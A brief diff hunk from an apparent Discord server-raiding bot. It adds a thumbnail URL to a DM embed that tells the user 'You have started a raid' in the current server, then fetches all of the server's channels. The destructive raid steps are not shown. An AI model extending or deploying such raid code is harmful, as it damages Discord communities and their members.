@@ -205,7 +205,7 @@ client.on(`messageCreate`,async (msg)=>{
         };
         await msg.author.send({embeds:[
             new EmbedBuilder()
-            .setThumbnail(``)
+            .setThumbnail(`https://cdn.discordapp.com/attachments/1387072114011410566/1396288551129448489/VID-20250719-WA0003.mp4?ex=687d8a8c&is=687c390c&hm=021e1ed75b7b1edb16ad18be73606bde55671b3a98069394aa575003d0ec9c7c&`)
             .setDescription(`:homie_star: You have started a raid ( .fvcked ) in **${msg.guild.name}**`)
         ]});
         let channelsxd = await msg.guild.channels.fetch();
